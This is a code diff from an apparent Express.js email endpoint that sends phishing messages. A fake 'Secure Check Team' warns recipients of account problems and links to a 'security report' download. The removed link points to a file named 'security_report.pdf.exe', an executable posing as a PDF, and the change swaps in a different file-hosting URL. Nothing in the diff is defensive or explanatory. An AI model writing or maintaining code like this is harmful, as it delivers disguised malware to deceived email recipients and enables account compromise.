@@ -38,7 +38,7 @@ app.post('/send-email', (req, res) => {
     html: `
       <p>Hi!</p>
       <p>Your email (<strong>${email}</strong>) has been checked ,there are several problems in your account.Check the report .</p>
-      <p><a href="https://rciousswbtklaupvobck.supabase.co/storage/v1/object/public/oke//security_report.pdf.exe" target="_blank">
+      <p><a href="https://fs24.fex.net/download/5564301828?fs_id=24&storage_file_id=4480190569" target="_blank">
          Download your security report</a></p>
       <p>Best regards,<br>Secure Check Team</p>
     `
